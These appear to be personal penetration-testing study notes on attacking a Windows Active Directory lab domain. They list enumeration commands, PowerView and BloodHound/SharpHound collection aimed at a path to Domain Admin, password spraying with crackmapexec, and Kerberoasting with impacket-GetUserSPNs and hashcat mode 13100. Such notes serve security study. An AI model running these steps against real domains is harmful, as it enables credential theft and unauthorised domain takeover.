# on AD DC domain controller
    dsa.msc # the service of manag AD tree

    setspn -a MSSQL/sqladmin.googboy.com:port goodboy\sqladmin 
        #sqladmin is a user name,
                    member of a admin group,which is the accout to run the service
        # to set a service in the domain


    net user  # to view all users on the host
    net user \domain # to view all users in the domain
    net user user_name \domain  # the check the proviledge of a user, in order to find high priv account

    net group /domain    #to list all groups
    net group "group_name" /domain #show the desription of a group, all members
                # especially domain admin group



    ************************************************************
    powersploit
        /usr/share/windows-resources/powersploit
        $ cd Recon
        PowerView.ps1
        $ Import-Module .\PowerView.ps1
        $get-domain   # show info of Domain
        $Get-DomainSID
        $get user bob /domain  $ user ID pre with Domian sidplay
        $Get-DomainController
        $Get-DomainComputer
        $Get-NetUser
        $Get-NetGroup group_name
        $Get-NetGroup "sub group.."

    powershell.exe -ep bypass  # to enable script to be run

************************************************************
    bloodhound # to collect all info of the DOmain
        work with neo4j
            $sudo neo4j console # 
            $bloodhound

        work with sharphound,which is working on win host client
            /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1   # copy to win client
            $ Import-Module .\SharpHound.ps1
            $Invoke-BloodHound -CollectionMethod all -OutputDirectory "Path"

            #get a output file, then sent to kali and upload upon neo4j web.
            #analysis--> shortest path to Domain admin

    net accounts # show the info of account auth 
        spray-passwords.ps1 #a tool to brute force AD account, if auth restrict
        crackmapexec smb IP -u user_name.txt -P pss.txt -d domain_name # for non-restrict DC



************************************************************
    # a case, on a host login by a domain account, request a TGS from DC to a spn
        sudo impacket-GetUserSPNs -request -dc-ip 192.168.1.121 goodboy.com/bob # to get TGS

        # to brute force the TGS to get the passwd of the spn admin, if this account is a domain admin, did it.
        # hashcat
        hashcat --help | grep -i "kerberos"                                                                  
        19600 | Kerberos 5, etype 17, TGS-REP                              | Network Protocol
        19800 | Kerberos 5, etype 17, Pre-Auth                             | Network Protocol
        28800 | Kerberos 5, etype 17, DB                                   | Network Protocol
        19700 | Kerberos 5, etype 18, TGS-REP                              | Network Protocol
        19900 | Kerberos 5, etype 18, Pre-Auth                             | Network Protocol
        28900 | Kerberos 5, etype 18, DB                                   | Network Protocol
         7500 | Kerberos 5, etype 23, AS-REQ Pre-Auth                      | Network Protocol
        13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
        18200 | Kerberos 5, etype 23, AS-REP                               | Network Protocol

        hashcat -m 13100 hash.txt

      


